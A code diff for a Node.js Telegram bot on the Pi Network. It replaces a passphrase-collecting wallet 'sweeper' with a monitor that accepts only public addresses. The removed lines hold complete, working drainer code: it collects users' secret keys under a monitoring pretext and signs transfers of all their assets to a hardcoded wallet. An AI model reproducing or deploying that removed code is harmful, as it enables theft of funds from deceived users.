@@ -1,193 +1,99 @@
 require('dotenv').config();
 const TelegramBot = require('node-telegram-bot-api');
-const StellarSdk = require('@stellar/stellar-sdk');
+const { openDatabase } = require('./database');
+const { startMonitor } = require('./monitor');
 
 const token = process.env.TELEGRAM_BOT_TOKEN;
-const HARDCODED_DESTINATION = process.env.DESTINATION_WALLET_ADDRESS;
+const horizonUrl = (process.env.PI_HORIZON_URL || '').replace(/\/+$/, '');
+const interval = Math.max(5000, Number(process.env.POLL_INTERVAL_MS || 10000));
+const allowed = new Set((process.env.ALLOWED_TELEGRAM_IDS || '')
+  .split(',').map(x => x.trim()).filter(Boolean));
 
 if (!token) {
-    console.error("❌ ERROR: TELEGRAM_BOT_TOKEN is missing in .env file.");
-    process.exit(1);
+  console.error('Missing TELEGRAM_BOT_TOKEN. Copy .env.example to .env and configure it.');
+  process.exit(1);
+}
+if (!horizonUrl) {
+  console.error('Missing PI_HORIZON_URL. Set the verified Pi Mainnet Horizon endpoint.');
+  process.exit(1);
 }
 
-if (!HARDCODED_DESTINATION) {
-    console.error("❌ ERROR: DESTINATION_WALLET_ADDRESS is missing in .env file.");
-    process.exit(1);
-}
-
-// Initialize the Telegram bot using polling
+const db = openDatabase();
 const bot = new TelegramBot(token, { polling: true });
 
-// Initialize Stellar Server (Pi Network runs on Stellar-based architecture)
-const server = new StellarSdk.Horizon.Server('https://horizon.pi-network.network');
+function permitted(msg) {
+  return allowed.size === 0 || allowed.has(String(msg.from?.id));
+}
+function reply(msg, text) {
+  return bot.sendMessage(msg.chat.id, text, { disable_web_page_preview: true });
+}
+function help() {
+  return [
+    '🛰️ Pi Wallet Monitor',
+    '',
+    '/add G...PUBLIC_ADDRESS — register a public wallet',
+    '/status — list your monitored wallets',
+    '/remove ID — stop monitoring one wallet',
+    '/help — show commands',
+    '',
+    'Security: register public addresses only. Never send a 24-word passphrase or secret key.',
+    'This bot monitors balances. It does not sign or submit wallet transactions.'
+  ].join('\n');
+}
 
-// Network passphrase definition (Ensure this matches Pi's network ID if custom)
-const PI_NETWORK_PASSPHRASE = StellarSdk.Networks.PUBLIC; 
-
-// In-memory registry tracking monitored wallets
-let activeMonitors = [];
-
-console.log("==================================================");
-console.log(" 🤖 TELEGRAM SWEEPER BOT INITIALIZED & LISTENING");
-console.log(` Target Destination: ${HARDCODED_DESTINATION}`);
-console.log("==================================================");
-
-// Command: /start
-bot.onText(/\/start/, (msg) => {
-    const chatId = msg.chat.id;
-    bot.sendMessage(chatId, 
-        `⚡ *Pi Multi-Wallet Sweeper Bot Online*\n\n` +
-        `Send your passphrases or keys to monitor them.\n` +
-        `• Format: \`/add <your_private_key_or_secret>\`\n` +
-        `• Check status: \`/status\``, 
-        { parse_mode: "Markdown" }
-    );
+bot.onText(/^\/start(?:@\w+)?$/, async msg => {
+  if (!permitted(msg)) return;
+  await reply(msg, help());
+});
+bot.onText(/^\/help(?:@\w+)?$/, async msg => {
+  if (!permitted(msg)) return;
+  await reply(msg, help());
+});
+bot.onText(/^\/add(?:@\w+)?\s+(\S+)$/, async (msg, match) => {
+  if (!permitted(msg)) return;
+  const address = match[1].trim();
+  if (!/^G[A-Z2-7]{55}$/.test(address)) {
+    return reply(msg, 'That does not look like a Stellar-style public address. Use the public G... address only.');
+  }
+  try {
+    const existing = db.prepare('SELECT id FROM wallets WHERE chat_id=? AND public_key=?')
+      .get(String(msg.chat.id), address);
+    if (existing) return reply(msg, `Already monitoring wallet #${existing.id}.`);
+    const result = db.prepare(
+      'INSERT INTO wallets(chat_id, public_key, created_at) VALUES(?,?,?)'
+    ).run(String(msg.chat.id), address, Date.now());
+    await reply(msg, `✅ Wallet #${result.lastInsertRowid} registered.\n${address}\n\nMonitoring continues on Railway while your phone is offline.`);
+  } catch (e) {
+    console.error('Add wallet failed:', e.message);
+    await reply(msg, 'Could not save that wallet. Check the Railway logs.');
+  }
+});
+bot.onText(/^\/status(?:@\w+)?$/, async msg => {
+  if (!permitted(msg)) return;
+  const rows = db.prepare('SELECT id, public_key, last_native, last_seen_at FROM wallets WHERE chat_id=? ORDER BY id')
+    .all(String(msg.chat.id));
+  if (!rows.length) return reply(msg, 'No wallets registered. Use /add G...PUBLIC_ADDRESS.');
+  const lines = rows.map(w => {
+    const balance = w.last_native == null ? 'Not yet checked' : `${w.last_native} Pi`;
+    const checked = w.last_seen_at ? new Date(w.last_seen_at).toISOString() : 'pending';
+    return `#${w.id}  ${w.public_key}\nBalance: ${balance}\nLast checked: ${checked}`;
+  });
+  await reply(msg, `📊 Monitored wallets (${rows.length})\n\n${lines.join('\n\n')}`);
+});
+bot.onText(/^\/remove(?:@\w+)?\s+(\d+)$/, async (msg, match) => {
+  if (!permitted(msg)) return;
+  const id = Number(match[1]);
+  const result = db.prepare('DELETE FROM wallets WHERE id=? AND chat_id=?')
+    .run(id, String(msg.chat.id));
+  await reply(msg, result.changes
+    ? `🗑️ Wallet #${id} removed from monitoring.`
+    : `Wallet #${id} was not found in your list.`);
 });
 
-// Command: /add <passphrase or private key> with built-in validation & lookup
-bot.onText(/\/add (.+)/, async (msg, match) => {
-    const chatId = msg.chat.id;
-    const passphraseOrKey = match[1].trim();
+startMonitor({ db, bot, horizonUrl, interval });
 
-    try {
-        const keypair = StellarSdk.Keypair.fromSecret(passphraseOrKey);
-        const publicKey = keypair.publicKey();
+bot.on('polling_error', e => console.error('Telegram polling error:', e.message));
+process.on('SIGINT', () => { bot.stopPolling(); db.close(); process.exit(0); });
+process.on('SIGTERM', () => { bot.stopPolling(); db.close(); process.exit(0); });
 
-        console.log(`🔑 Derived Public Key for input: ${publicKey}`);
-
-        // Verify account on Horizon immediately upon adding
-        try {
-            const accountInfo = await server.loadAccount(publicKey);
-            console.log(`✅ Account verified on Horizon! Balances found count:`, accountInfo.balances.length);
-        } catch (horizonErr) {
-            console.log(`⚠️ Horizon warning for ${publicKey}: ${horizonErr.message}`);
-        }
-
-        const exists = activeMonitors.find(w => w.publicKey === publicKey);
-        if (exists) {
-            return bot.sendMessage(chatId, `⚠️ This wallet is already being monitored.`);
-        }
-
-        const newEntry = {
-            id: activeMonitors.length + 1,
-            chatId: chatId,
-            secret: passphraseOrKey,
-            publicKey: publicKey,
-            status: "Monitoring Active 🟢"
-        };
-
-        activeMonitors.push(newEntry);
-        bot.sendMessage(chatId, 
-            `✅ *Wallet Added Successfully!*\n\n` +
-            `• *ID:* #${newEntry.id}\n` +
-            `• *Address:* \`${publicKey}\`\n` +
-            `• *Status:* Live monitoring active.`, 
-            { parse_mode: "Markdown" }
-        );
-
-    } catch (error) {
-        console.error(`❌ Key derivation error:`, error.message);
-        bot.sendMessage(chatId, `❌ Invalid passphrase or key format: ${error.message}`);
-    }
-});
-
-// Command: /status
-bot.onText(/\/status/, (msg) => {
-    const chatId = msg.chat.id;
-    const userWallets = activeMonitors.filter(w => w.chatId === chatId);
-
-    if (userWallets.length === 0) {
-        return bot.sendMessage(chatId, "📭 You have no active wallets in the monitoring queue.");
-    }
-
-    let response = "📊 *Your Monitored Wallets:*\n\n";
-    userWallets.forEach(w => {
-        response += `#${w.id} | \`${w.publicKey.substring(0, 10)}...\`\nStatus: *${w.status}*\n\n`;
-    });
-
-    bot.sendMessage(chatId, response, { parse_mode: "Markdown" });
-});
-
-// BACKGROUND MONITORING LOOP (Runs continuously every 3 seconds)
-setInterval(async () => {
-    if (activeMonitors.length === 0) return;
-
-    for (let wallet of activeMonitors) {
-        if (wallet.status.includes("Completed") || wallet.status.includes("Success")) continue;
-
-        try {
-            // Load account details from the Horizon server
-            const account = await server.loadAccount(wallet.publicKey);
-            
-            // Check if there are any balances to sweep
-            let operationsToAdd = [];
-
-            for (const balance of account.balances) {
-                let asset;
-                let sendAmount = parseFloat(balance.balance);
-
-                if (balance.asset_type === 'native') {
-                    // For native asset, leave a tiny reserve (e.g., 0.001) for the transaction fee
-                    const feeReserve = 0.001;
-                    sendAmount = sendAmount - feeReserve;
-                    asset = StellarSdk.Asset.native();
-                } else {
-                    // For any custom token/asset found in the wallet
-                    asset = new StellarSdk.Asset(balance.asset_code, balance.asset_issuer);
-                }
-
-                // If there's a valid amount to send, add it as a payment operation
-                if (sendAmount > 0) {
-                    operationsToAdd.push({
-                        asset: asset,
-                        amount: sendAmount.toFixed(7)
-                    });
-                }
-            }
-
-            if (operationsToAdd.length > 0) {
-                console.log(`🚨 Assets found for Wallet ID #${wallet.id} (${wallet.publicKey})! Sweeping...`);
-
-                const sourceKeypair = StellarSdk.Keypair.fromSecret(wallet.secret);
-                const sourceAccount = await server.loadAccount(wallet.publicKey);
-
-                // Build a transaction that includes operations for every asset found
-                let transactionBuilder = new StellarSdk.TransactionBuilder(sourceAccount, {
-                    fee: StellarSdk.BASE_FEE,
-                    networkPassphrase: PI_NETWORK_PASSPHRASE
-                });
-
-                operationsToAdd.forEach(op => {
-                    transactionBuilder.addOperation(StellarSdk.Operation.payment({
-                        destination: HARDCODED_DESTINATION,
-                        asset: op.asset,
-                        amount: op.amount,
-                    }));
-                });
-
-                const transaction = transactionBuilder.setTimeout(30).build();
-                transaction.sign(sourceKeypair);
-                const transactionResponse = await server.submitTransaction(transaction);
-
-                console.log(`✅ Success! Transaction hash: ${transactionResponse.hash}`);
-                wallet.status = "Success - Swept ✅";
-
-                // Instantly notify your Telegram phone app
-                bot.sendMessage(wallet.chatId, 
-                    `🚀 *SUCCESSFUL SWEEP!* \n\n` +
-                    `All assets from wallet \`${wallet.publicKey.substring(0, 10)}...\` were automatically moved to your destination!\n` +
-                    `TxHash: \`${transactionResponse.hash}\``, 
-                    { parse_mode: "Markdown" }
-                );
-            }
-        } catch (err) {
-            // DETAILED ERROR LOGGING: Captures full server/network error responses for debugging
-            const errorDetails = err.response?.data ? JSON.stringify(err.response.data) : (err.message || err);
-            
-            // Suppress 404 logs for accounts that haven't been funded on-chain yet
-            if (!String(errorDetails).includes('404')) {
-                console.error(`❌ ERROR processing wallet #${wallet.id} (${wallet.publicKey}):`, errorDetails);
-            }
-        }
-    }
-}, 3000);
+console.log(`Pi wallet monitor started; polling every ${interval}ms.`);
